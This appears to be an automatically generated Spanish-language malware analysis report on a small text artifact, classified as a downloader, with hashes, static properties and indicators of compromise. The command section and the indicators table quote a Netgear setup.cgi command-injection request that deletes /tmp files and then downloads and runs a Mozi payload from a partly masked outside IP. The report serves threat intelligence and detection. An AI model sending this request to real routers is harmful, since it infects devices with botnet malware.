# 🧬 Payload Analysis

`23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:18:27+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21`
- **SHA1:** `0bbbcfe440f5c9b448f97b1b8666ab2958f51e5f`
- **MD5:** `91df38e077ac4cef03a6741337a0e4c7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 175 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 123.5.191.XXX | static_analysis |
| url | hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| hash | 23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21 | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
